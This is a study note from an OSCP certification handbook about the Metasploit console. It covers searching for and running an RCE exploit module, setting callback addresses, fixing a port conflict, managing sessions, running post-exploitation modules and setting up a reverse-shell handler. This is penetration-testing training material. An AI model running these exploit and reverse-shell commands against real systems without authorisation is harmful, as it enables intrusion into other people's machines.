---
title: "Metasploit"
slug: metasploit
category: notes
handbook: oscp
tags: ["exploit-development"]
draft: false
pubDatetime: 2026-09-08T22:24:21+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "The msfconsole workflow: find the module, set the addresses, run it."
---
The msfconsole workflow: find the module, set the addresses, run it. Modules for specific services (mobile_mouse_rce, PrintSpoofer equivalents) live in the lab notes; this is the general pattern.

## Console workflow

```text
msfconsole
search mobile_mouse            # by name, or search cve:2023-31902
use exploit/windows/misc/mobile_mouse_rce
info                           # what it does, which options matter
show options                   # the set list
check                          # modules with AutoCheck verify before firing
run
```

## The addresses

- `RHOSTS` is the target, `LHOST` the callback address for the payload. LHOST must be an IP the target can route back to, the same discipline as every reverse shell.
- Stager-style modules (server exploits that pull a payload) also run their own HTTP server: `SRVHOST` is what the target must be able to reach for the staging URL, and `SRVPORT` defaults to 8080, which collides with whatever else holds it on Kali: Burp's default listener, or a running ligolo-proxy API listener (127.0.0.1:8080) when ligolo's WebUI is enabled, among others. The failure signature is `Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080)` mid-exploit, after check has already passed. Move it with `set SRVPORT 8081` or stop the squatter; the stager URL is regenerated on the next `run`.
- `set payload windows/x64/shell_reverse_tcp` when the default is unwanted; the module's DefaultOptions otherwise stand.

## Sessions

A session is a live shell owned by the framework. Ctrl+Z backgrounds it, `sessions -l` lists, `sessions -i <id>` returns, `sessions -K` kills. Post-exploitation modules run against one:

```text
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

meterpreter sessions add `upload`/`download`, `getuid`, and the post module set; plain shell sessions still work with every post module that needs only a channel.

## Passive handler

For staged payloads generated elsewhere (msfvenom output, another module's drop), catch them with:

```text
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST KALI
set LPORT 443
run -j
```

`-j` runs it as a job so the console stays free; `jobs -l` and `kill <id>` manage those.
